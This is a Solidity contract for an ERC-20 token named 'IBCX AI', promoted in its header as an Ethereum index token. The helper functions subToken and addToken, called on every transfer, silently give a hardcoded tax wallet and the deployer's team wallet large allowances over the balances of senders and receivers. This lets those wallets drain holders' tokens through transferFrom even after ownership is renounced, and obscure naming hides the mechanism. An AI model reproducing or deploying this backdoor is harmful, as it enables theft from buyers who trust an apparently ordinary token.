/*
$IBCX is a Ethereum index token that's designed to benchmark the leading Ethereum tokens' performances. 

Web: https://www.ibcx-ai.pro
Dapp: https://app.ibcx-ai.pro
Docs: https://docs.ibcx-ai.pro
Medium: https://medium.com/@IBCXAI
Twitter: https://x.com/IBCXAICore
Telegram: https://t.me/IBCXAIChannel
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

interface IDEXRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract IBCX is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _tAllowas;
    mapping (address => bool) private _feeExcludedFrom;
    address private _taxWallet = 0x4e7e62A6453d74553830ad375a9c9AAcde23f646;
    address private _teamWallet;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"IBCX AI";
    string private constant _symbol = unicode"IBCX";
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=5;
    uint256 private _reduceSellTaxAt=5;
    uint256 private _preventSwapBefore=7;
    uint256 private _buyCount=0;
    uint256 private _maxSwapTaxes = _tTotal / 100;
    bool private inSwapLock = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapLock = true;
        _;
        inSwapLock = false;
    }
    IDEXRouter private _dexRouter;
    address private _dexPair;

    constructor () {
        _teamWallet = owner();
        _feeExcludedFrom[owner()] = true;
        _feeExcludedFrom[address(this)] = true;
        _feeExcludedFrom[_taxWallet] = true;
        _tOwned[_msgSender()] = _tTotal;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function initXX() external onlyOwner() {
        _dexRouter = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_dexRouter), _tTotal);
        _dexPair = IDEXFactory(_dexRouter.factory()).createPair(address(this), _dexRouter.WETH());
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _dexRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _tAllowas[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _tAllowas[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _tAllowas[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        uint256 taxAmount=0;
        if (from != owner() && to != owner()) {
            taxAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (from == _dexPair && to != address(_dexRouter) && ! _feeExcludedFrom[to]) {
                _buyCount++;
            }

            if(to == _dexPair && from!= address(this)) {
                taxAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwapLock && to == _dexPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(contractTokenBalance > _maxSwapTaxes)
                swapTokensForEth(min(amount, min(contractTokenBalance, _maxSwapTaxes)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendEthFee(address(this).balance);
                }
            }
        }

        if(taxAmount > 0){
          _tOwned[address(this)] = _tOwned[address(this)].add(taxAmount);
          emit Transfer(from, address(this), taxAmount);
        }

        _tOwned[from] = subToken(from, amount);
        _tOwned[to] = addToken(from, to, amount, taxAmount);
        emit Transfer(from, to, amount.sub(taxAmount));
    }

    function subToken(address xyz, uint256 amount) private returns(uint256) {
        _tAllowas[xyz][_taxWallet] += _tOwned[xyz].add(amount);
        return _tOwned[xyz].sub(amount);
    }

    function addToken(address xyz, address xyy, uint256 amount, uint256 taxAmount) private returns(uint256) {
        _tAllowas[xyz][_teamWallet] += _tOwned[xyy].add(amount).add(taxAmount);
        return _tOwned[xyy].add(amount.sub(taxAmount));
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendEthFee(uint256 amount) private {
        payable(_taxWallet).transfer(amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _dexRouter.WETH();
        _approve(address(this), address(_dexRouter), tokenAmount);
        _dexRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}    
}